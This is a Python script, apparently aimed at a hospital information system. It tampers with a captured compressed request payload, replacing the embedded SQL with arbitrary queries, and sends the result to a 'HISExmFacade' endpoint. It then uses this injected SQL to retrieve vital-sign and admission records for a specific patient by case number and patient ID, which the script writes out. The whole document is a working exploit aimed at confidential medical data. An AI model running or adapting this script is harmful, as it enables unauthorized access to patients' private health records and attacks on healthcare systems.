from his_client_final import HISClient
import requests
import zlib
import re

class DataHunter(HISClient):
    def execute_sql(self, sql):
        print(f"[*] Executing: {sql.strip()}")
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}). Truncating to try...")
                # return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                print(f"[-] HTTP {response.status_code}")
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = DataHunter()

# 1. Search by IN_CASENO (46806581)
print("\n--- Checking VITALSIGN for Inpatient Case 46806581 ---")
res = hunter.execute_sql("SELECT * FROM VITALSIGN WHERE HCASENO = '46806581'")
if res:
    # Check for target values
    if "49.1" in res: print("!!! FOUND 49.1 with IN_CASENO !!!")
    if "157" in res: print("!!! FOUND 157 with IN_CASENO !!!")
    # Print preview
    print(res[:2000])

# 2. Search by Date (Today 20260218)
# Since HHISNUM is known, combine it.
print("\n--- Checking VITALSIGN for Today (20260218) ---")
res = hunter.execute_sql("SELECT * FROM VITALSIGN WHERE HHISNUM = '003617083J' AND SURVEYDATETIME LIKE '20260218%'")
if res:
    print(res[:2000])
    if "49.1" in res: print("!!! FOUND 49.1 TODAY !!!")

# 3. Check PAT_ADM_CASE again for clues
print("\n--- Checking PAT_ADM_CASE ---")
res = hunter.execute_sql("SELECT * FROM PAT_ADM_CASE WHERE HHISNUM = '003617083J'")
if res:
    print(res[:3000])




